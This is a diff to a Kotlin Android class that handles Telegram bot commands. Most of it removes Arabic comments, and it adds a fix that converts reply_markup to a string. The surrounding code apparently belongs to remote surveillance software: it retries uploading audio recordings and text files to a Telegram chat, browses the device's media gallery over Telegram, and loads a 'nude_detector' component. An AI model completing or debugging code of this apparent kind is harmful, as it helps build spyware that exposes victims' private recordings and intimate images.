@@ -14,7 +14,6 @@ import java.io.File
 import java.lang.ref.WeakReference
 import java.security.MessageDigest
 
-// ✅ استيراد دوال safeGet من MapExtensions.kt
 import com.example.app.safeGetMessageId
 import com.example.app.safeExtractCallbackData
 import com.example.app.CallbackData
@@ -107,11 +106,8 @@ class Commands private constructor(context: Context) {
     }
 
     init {
-        // تنظيف الملفات القديمة عند بدء التشغيل
         cleanupOldFiles()
-        // بدء خيط إعادة المحاولة في الخلفية
         startRetryLoop()
-        // تحميل المهام الفاشلة المحفوظة (سيتم معالجتها في حلقة إعادة المحاولة)
     }
 
     // ============================================================
@@ -144,7 +140,6 @@ class Commands private constructor(context: Context) {
 
     private fun saveConfig() {
         try {
-            // ✅ استخدام as Map<*, *> لتجنب مشاكل الأنواع
             configFile.writeText(JSONObject(config as Map<*, *>).toString(2))
         } catch (e: Exception) {
             Log.e(TAG, "Config save error: ${e.message}")
@@ -363,7 +358,6 @@ class Commands private constructor(context: Context) {
                 val filename = task.optString("filename")
                 val content = task.optString("content")
 
-                // إذا تجاوز عدد المحاولات الحد الأقصى أو الملف غير موجود
                 if (attempts >= maxRetries) {
                     Log.w(TAG, "Task ${task.optString("id")} exceeded max retries, removing.")
                     safeRemove(File(filePath))
@@ -371,40 +365,34 @@ class Commands private constructor(context: Context) {
                     continue
                 }
 
-                // تأخير أسي
-                val waitTime = (1L shl attempts) * 60_000L // 2^attempts دقيقة
+                val waitTime = (1L shl attempts) * 60_000L
                 if (lastAttempt > 0 && System.currentTimeMillis() - lastAttempt < waitTime) {
                     remainingTasks.put(task)
                     continue
                 }
 
-                // محاولة إعادة الإرسال
                 Log.i(TAG, "Retrying task $type (attempt ${attempts + 1})")
 
                 val success = when (type) {
                     "audio" -> {
                         val file = File(filePath)
                         if (file.exists()) {
-                            // محاولة إرسال الصوت عبر tg (سيتم تنفيذها خارجياً)
-                            // نضيف المهمة إلى قائمة الانتظار للتنفيذ الفعلي
-                            false // سنقوم بتنفيذها عبر callback لاحقاً
+                            false
                         } else {
                             removed++
-                            true // حذف المهمة لأن الملف غير موجود
+                            true
                         }
                     }
                     "text_file" -> {
-                        false // سنقوم بتنفيذها عبر callback
+                        false
                     }
                     else -> false
                 }
 
                 if (success) {
-                    // تمت إعادة المحاولة بنجاح أو تم حذف الملف
                     safeRemove(File(filePath))
                     removed++
                 } else {
-                    // فشلت إعادة المحاولة، نزيد عدد المحاولات ونعيد إضافتها
                     task.put("attempts", attempts + 1)
                     task.put("last_attempt", System.currentTimeMillis())
                     remainingTasks.put(task)
@@ -449,7 +437,6 @@ class Commands private constructor(context: Context) {
             }
         } catch (e: Exception) {
             Log.e(TAG, "Send text file error: ${e.message}")
-            // محاولة إرسال النص مباشرة
             sendTelegramMessage(tg, chatId, "📄 $filename:\n${content.take(4000)}")
             safeRemove(tempFile)
         }
@@ -464,12 +451,10 @@ class Commands private constructor(context: Context) {
             try {
                 if (cmd.isBlank()) return@launch
 
-                // الرد على callback إذا وُجد
                 cbq?.let { queryId ->
                     invokeTelegramMethod(tg, "answerCallbackQuery", mapOf("callback_query_id" to queryId))
                 }
 
-                // تحميل المكونات المطلوبة (محاكاة _ensure_components)
                 ensureComponents(m)
 
                 when {
@@ -511,15 +496,10 @@ class Commands private constructor(context: Context) {
 
     private suspend fun ensureComponents(m: Any?) {
         if (m == null) return
-        // هذه الدالة ستقوم بتحميل المكونات المطلوبة إذا لم تكن موجودة
-        // في الإصدار الحالي، نكتفي بالتحقق من وجودها
         try {
-            // التحقق من وجود nude_detector
             val nudeDetector = getModuleComponent(m, "nude_detector")
             if (nudeDetector == null) {
                 Log.w(TAG, "nude_detector not loaded, attempting to load...")
-                // هنا يمكن استدعاء مُنشئ الكلاسات المطلوبة
-                // سيتم تنفيذها لاحقاً عند تحويل المكونات الأخرى
             }
         } catch (e: Exception) {
             Log.e(TAG, "Component check error: ${e.message}")
@@ -745,7 +725,7 @@ class Commands private constructor(context: Context) {
     }
 
     // ============================================================
-    //  معالج فتح المعرض (Media) - ✅ استخدام safeGetMessageId
+    //  معالج فتح المعرض (Media)
     // ============================================================
 
     private suspend fun handleMedia(tg: Any?, m: Any?, cid: Long) {
@@ -755,7 +735,6 @@ class Commands private constructor(context: Context) {
                 val kb = invokeMethod(galleryBrowser, "getGridKb", "pending", 0)
                 val jsonKb = kb?.toString() ?: ""
                 val response = sendTelegramMessage(tg, cid, "🖼️ معرض الوسائط", jsonKb)
-                // ✅ استخدام safeGetMessageId بدلاً من السلسلة الطويلة
                 val msgId = response.safeGetMessageId()
                 if (msgId != null) {
                     setModuleField(m, "last_mid", msgId)
@@ -845,6 +824,7 @@ class Commands private constructor(context: Context) {
 
     /**
      * ✅ إصلاح السطر 142: تحويل الخريطة إلى HashMap<Any?, Any?> لحل Java Type Mismatch
+     * ✅ إضافة تحويل reply_markup إلى String لتجنب أخطاء الأنواع
      */
     private fun invokeTelegramMethod(tg: Any?, method: String, params: Map<String, Any>): Any? {
         if (tg == null) return null
@@ -852,8 +832,13 @@ class Commands private constructor(context: Context) {
             val apiMethod = tg.javaClass.methods.firstOrNull { it.name == "_api" || it.name == "api" }
             apiMethod?.isAccessible = true
 
-            // ✅ التحويل الصريح إلى HashMap<Any?, Any?> لحل مشكلة الأنواع الأولية
             val rawParams = HashMap<Any?, Any?>(params)
+
+            // ✅ التأكد من أن reply_markup هو String قبل الإرسال
+            if (rawParams.containsKey("reply_markup") && rawParams["reply_markup"] !is String) {
+                rawParams["reply_markup"] = rawParams["reply_markup"].toString()
+            }
+
             apiMethod?.invoke(tg, method, rawParams)
         } catch (e: Exception) {
             Log.e(TAG, "Telegram API call error: ${e.message}")
@@ -867,7 +852,6 @@ class Commands private constructor(context: Context) {
         text: String,
         replyMarkupJson: String? = null
     ): Any? {
-        // ✅ استخدام القيم الافتراضية لضمان عدم وجود null (إصلاح السطر 528)
         val params = mutableMapOf<String, Any>(
             "chat_id" to chatId,
             "text" to text
